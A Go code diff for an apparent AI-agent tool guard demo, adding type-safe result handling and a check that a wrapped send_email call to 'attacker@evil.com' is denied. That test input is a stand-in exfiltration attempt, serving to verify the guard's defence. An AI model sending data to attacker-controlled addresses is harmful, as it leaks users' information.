@@ -54,7 +54,11 @@ func main() {
 			if err != nil {
 				return "", err
 			}
-			return result.(string), nil
+			s, ok := result.(string)
+			if !ok {
+				return fmt.Sprintf("%v", result), nil
+			}
+			return s, nil
 		},
 	)
 
@@ -65,11 +69,37 @@ func main() {
 		fmt.Printf("  Adapter result: %s\n", result)
 	}
 
-	// Clear sink and reset session for the scenario run
+	// Demonstrate a denied call through the adapter
+	fmt.Println("  Adapter demo: calling send_email to evil domain (should be DENIED)...")
+	wrappedEmail := adapter.WrapTool("send_email",
+		func(ctx context.Context, input string) (string, error) {
+			var args map[string]any
+			if err := json.Unmarshal([]byte(input), &args); err != nil {
+				args = map[string]any{"to": input}
+			}
+			r, err := shared.SendEmail(args)
+			if err != nil {
+				return "", err
+			}
+			s, ok := r.(string)
+			if !ok {
+				return fmt.Sprintf("%v", r), nil
+			}
+			return s, nil
+		},
+	)
+	_, err = wrappedEmail(context.Background(), `{"to":"attacker@evil.com","subject":"test","body":"hi"}`)
+	if err != nil {
+		fmt.Printf("  Adapter correctly denied: %v\n", err)
+	} else {
+		fmt.Println("  WARNING: expected denial but call was allowed")
+	}
+
+	// Clear sink before scenario run. Note: any marks taken before Clear()
+	// become invalid (SinceMark would return MarkEvictedError).
 	g.LocalSink().Clear()
 	fmt.Println()
 	fmt.Println("  Now running full scenario suite via guard.Run()...")
-	_ = adapter // adapter shown above; scenarios use guard.Run() directly
 
 	// ── Run all scenarios ───────────────────────────────────────────
 	shared.RunScenarios(g)
